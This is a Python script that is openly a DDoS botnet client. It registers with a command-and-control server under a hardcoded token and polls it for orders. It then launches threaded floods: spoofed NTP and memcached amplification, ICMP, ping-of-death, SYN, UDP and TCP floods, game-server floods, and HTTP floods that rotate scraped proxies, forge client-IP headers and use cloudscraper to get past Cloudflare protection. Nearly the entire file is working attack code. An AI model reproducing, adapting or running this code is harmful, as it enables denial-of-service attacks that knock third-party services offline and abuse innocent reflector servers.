#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import requests
import time
import random
import cloudscraper
import struct
import os
import sys
import socks
import ssl
from urllib.parse import urlparse
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import TCP
from icmplib import ping as pig
import threading

# Configuration (Hardcoded)
API_URL = "https://obscure-carnival-6954jxjjw69qhxp-5000.app.github.dev/api"  # Thay đổi host và port nếu cần
BOT_TOKEN = "HieuDeptraiKhoaiToMaiDinhVip999"  # Thay bằng token hợp lệ

# User-Agent Generation
base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f',
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
]

def rand_ua():
    chosen_user_agent = random.choice(base_user_agents)
    return chosen_user_agent.format(
        random.random() + 5,
        random.random() + random.randint(1, 8),
        random.random(),
        random.randint(2000, 2100),
        random.randint(92215, 99999),
        random.random() + random.randint(3, 9)
    )

# Attack Methods (Unchanged)
ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def NTP(target, port, timer):
    try:
        with open("ntpServers.txt", "r") as f:
            ntp_servers = f.readlines()
        packets = random.randint(10, 150)
    except Exception as e:
        print(f"Error loading ntpServers.txt: {e}")
        return
    server = random.choice(ntp_servers).strip()
    while time.time() < timer:
        try:
            packet = (
                IP(dst=server, src=target)
                / UDP(sport=random.randint(1, 65535), dport=int(port))
                / Raw(load=ntp_payload)
            )
            for _ in range(50000000):
                send(packet, count=packets, verbose=False)
        except Exception as e:
            pass

mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def MEM(target, port, timer):
    packets = random.randint(1024, 60000)
    try:
        with open("memsv.txt", "r") as f:
            memsv = f.readlines()
    except Exception as e:
        print(f"Error loading memsv.txt: {e}")
        return
    server = random.choice(memsv).strip()
    while time.time() < timer:
        try:
            packet = (
                IP(dst=server, src=target)
                / UDP(sport=port, dport=11211)
                / Raw(load=mem_payload)
            )
            for _ in range(5000000):
                send(packet, count=packets, verbose=False)
        except:
            pass

def icmp(target, timer):
    while time.time() < timer:
        try:
            for _ in range(5000000):
                packet = random._urandom(int(random.randint(1024, 60000)))
                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
        except:
            pass

def pod(target, timer):
    while time.time() < timer:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)
            send(packet)
        except:
            pass

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

def httpSpoofAttack(url, timer):
    timeout = time.time() + int(timer)
    try:
        with open("socks4.txt", "r") as f:
            proxies = f.readlines()
    except Exception as e:
        print(f"Error loading socks4.txt: {e}")
        return
    while time.time() < timeout:
        try:
            proxy = random.choice(proxies).strip().split(":")
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(urlparse(url).netloc), 443))
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
            req += f"User-Agent: {rand_ua()}\r\n"
            req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
            req += "X-Forwarded-Proto: Http\r\n"
            req += f"X-Forwarded-Host: {urlparse(url).netloc}, 1.1.1.1\r\n"
            req += f"Via: {spoofer()}\r\n"
            req += f"Client-IP: {spoofer()}\r\n"
            req += f"X-Forwarded-For: {spoofer()}\r\n"
            req += "Real-IP: {spoofer()}\r\n"
            req += "Connection: Keep-Alive\r\n\r\n"
            for _ in range(5000000000):
                s.send(str.encode(req))
            s.close()
        except:
            s.close()

def remove_by_value(arr, val):
    return [item for item in arr if item != val]

def run(target, proxies, cfbp):
    if cfbp == 0 and len(proxies) > 0:
        proxy = random.choice(proxies)
        proxiedRequest = requests.Session()
        proxiedRequest.proxies = {'http': 'http://' + proxy}
        headers = {'User-Agent': rand_ua()}
        try:
            response = proxiedRequest.get(target, headers=headers)
            if 200 <= response.status_code <= 226:
                for _ in range(100):
                    proxiedRequest.get(target, headers=headers)
            else:
                proxies = remove_by_value(proxies, proxy)
        except requests.RequestException:
            proxies = remove_by_value(proxies, proxy)
    elif cfbp == 1 and len(proxies) > 0:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        proxy = random.choice(proxies)
        proxies = {'http': 'http://' + proxy}
        try:
            a = scraper.get(target, headers=headers, proxies=proxies, timeout=15)
            if 200 <= a.status_code <= 226:
                for _ in range(100):
                    scraper.get(target, headers=headers, proxies=proxies, timeout=15)
            else:
                proxies = remove_by_value(proxies, proxy)
        except requests.RequestException:
            proxies = remove_by_value(proxies, proxy)
    else:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        try:
            scraper.get(target, headers=headers, timeout=15)
        except:
            pass

def thread(target, proxies, cfbp):
    while True:
        run(target, proxies, cfbp)
        time.sleep(1)

def httpio(target, times, threads, attack_type):
    proxies = []
    cfbp = 0 if attack_type.lower() == 'proxy' else 1
    try:
        proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
        proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
        raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
        proxies = proxyscrape_http.text.replace('\r', '').split('\n')
        proxies += proxy_list_http.text.replace('\r', '').split('\n')
        proxies += raw_github_http.text.replace('\r', '').split('\n')
    except:
        pass
    processes = []
    for _ in range(threads):
        p = threading.Thread(target=thread, args=(target, proxies, cfbp), daemon=True)
        processes.append(p)
        p.start()
    time.sleep(times)
    for p in processes:
        p.join()

def CFB(url, port, secs):
    url = url + ":" + port
    timeout = time.time() + int(secs)
    scraper = cloudscraper.create_scraper()
    while time.time() < timeout:
        headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            scraper.get(url, headers=headers, timeout=15)
            scraper.head(url, headers=headers, timeout=15)

def STORM_attack(ip, port, secs):
    ip = ip + ":" + port
    timeout = time.time() + int(secs)
    scraper = cloudscraper.create_scraper()
    s = requests.Session()
    while time.time() < timeout:
        headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            s.get(ip, headers=headers)
            s.head(ip, headers=headers)
            scraper.get(ip, headers=headers)

def GET_attack(ip, port, secs):
    ip = ip + ":" + port
    timeout = time.time() + int(secs)
    scraper = cloudscraper.create_scraper()
    s = requests.Session()
    while time.time() < timeout:
        headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            s.get(ip, headers=headers)
            scraper.get(ip, headers=headers)

def attack_udp(ip, port, secs, size):
    timeout = time.time() + secs
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size):
    timeout = time.time() + secs
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < timeout:
                s.send(random._urandom(size))
        except:
            pass
        finally:
            s.close()

def attack_SYN(ip, port, secs):
    timeout = time.time() + secs
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, 0b01000000, 0, 0, 0, 0)
            while time.time() < timeout:
                s.send(pkt)
        except:
            pass
        finally:
            s.close()

def attack_tup(ip, port, secs, size):
    timeout = time.time() + secs
    while time.time() < timeout:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dport = random.randint(1, 65535) if port == 0 else port
        try:
            data = random._urandom(size)
            tcp.connect((ip, port))
            udp.sendto(data, (ip, dport))
            tcp.send(data)
        except:
            pass
        finally:
            udp.close()
            tcp.close()

def attack_hex(ip, port, secs):
    timeout = time.time() + secs
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(6):
            s.sendto(payload, (ip, port))
        s.close()

def attack_vse(ip, port, secs):
    timeout = time.time() + secs
    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
               b'\x20\x51\x75\x65\x72\x79\x00')
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(2):
            s.sendto(payload, (ip, port))
        s.close()

def attack_roblox(ip, port, secs, size):
    timeout = time.time() + secs
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            ran = random.randrange(10 ** 80)
            hex_data = "%064x" % ran
            hex_data = hex_data[:64]
            s.sendto(bytes.fromhex(hex_data) + bytes_data, (ip, dport))
        s.close()

def attack_junk(ip, port, secs):
    timeout = time.time() + secs
    payload = b'\x00' * 64
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(3):
            s.sendto(payload, (ip, port))
        s.close()

# Register bot with C2
def register():
    response = requests.post(f"{API_URL}/register", json={"token": BOT_TOKEN})
    if response.status_code == 200:
        print("Bot registered successfully")
    else:
        print(f"Registration failed: {response.text}")
        exit(1)

# Receive and execute commands
def receive_and_execute():
    while True:
        try:
            response = requests.get(f"{API_URL}/receive", params={"token": BOT_TOKEN})
            if response.status_code == 200:
                data = response.json()
                command = data.get('command')
                if command:
                    print(f"Received command: {command}")
                    args = command.split()
                    cmd = args[0].upper()

                    if cmd == '.UDP':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5])
                        for _ in range(threads):
                            threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()

                    elif cmd == '.TCP':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5])
                        for _ in range(threads):
                            threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                    elif cmd == '.NTP':
                        ip = args[1]
                        port = int(args[2])
                        timer = time.time() + int(args[3])
                        threads = int(args[4])
                        for _ in range(threads):
                            threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()

                    elif cmd == '.MEM':
                        ip = args[1]
                        port = int(args[2])
                        timer = time.time() + int(args[3])
                        threads = int(args[4])
                        for _ in range(threads):
                            threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()

                    elif cmd == '.ICMP':
                        ip = args[1]
                        timer = time.time() + int(args[2])
                        threads = int(args[3])
                        for _ in range(threads):
                            threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()

                    elif cmd == '.POD':
                        ip = args[1]
                        timer = time.time() + int(args[2])
                        threads = int(args[3])
                        for _ in range(threads):
                            threading.Thread(target=pod, args=(ip, timer), daemon=True).start()

                    elif cmd == '.TUP':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5])
                        for _ in range(threads):
                            threading.Thread(target=attack_tup, args=(ip, port, secs, size), daemon=True).start()

                    elif cmd == '.HEX':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        threads = int(args[4])
                        for _ in range(threads):
                            threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()

                    elif cmd == '.ROBLOX':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5])
                        for _ in range(threads):
                            threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()

                    elif cmd == '.VSE':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        threads = int(args[4])
                        for _ in range(threads):
                            threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()

                    elif cmd == '.JUNK':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5])
                        for _ in range(threads):
                            threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                            threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                            threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                    elif cmd == '.SYN':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        threads = int(args[4])
                        for _ in range(threads):
                            threading.Thread(target=attack_SYN, args=(ip, port, secs), daemon=True).start()

                    elif cmd == '.HTTPSTORM':
                        url = args[1]
                        port = args[2]
                        secs = time.time() + int(args[3])
                        threads = int(args[4])
                        for _ in range(threads):
                            threading.Thread(target=STORM_attack, args=(url, port, secs), daemon=True).start()

                    elif cmd == '.HTTPGET':
                        url = args[1]
                        port = args[2]
                        secs = time.time() + int(args[3])
                        threads = int(args[4])
                        for _ in range(threads):
                            threading.Thread(target=GET_attack, args=(url, port, secs), daemon=True).start()

                    elif cmd == '.HTTPCFB':
                        url = args[1]
                        port = args[2]
                        secs = time.time() + int(args[3])
                        threads = int(args[4])
                        for _ in range(threads):
                            threading.Thread(target=CFB, args=(url, port, secs), daemon=True).start()

                    elif cmd == '.HTTPIO':
                        url = args[1]
                        secs = int(args[2])
                        threads = int(args[3])
                        attack_type = args[4]
                        threading.Thread(target=httpio, args=(url, secs, threads, attack_type), daemon=True).start()

                    elif cmd == '.HTTPSPOOF':
                        url = args[1]
                        timer = time.time() + int(args[2])
                        threads = int(args[3])
                        for _ in range(threads):
                            threading.Thread(target=httpSpoofAttack, args=(url, timer), daemon=True).start()

                    elif cmd == 'PING':
                        requests.post(f"{API_URL}/status", json={"token": BOT_TOKEN, "status": "PONG"})

            time.sleep(5)  # Poll every 5 seconds
        except Exception as e:
            print(f"Error processing command: {e}")
            time.sleep(5)

if __name__ == '__main__':
    try:
        register()
        receive_and_execute()
    except Exception as e:
        print(f"Bot failed to start: {e}")
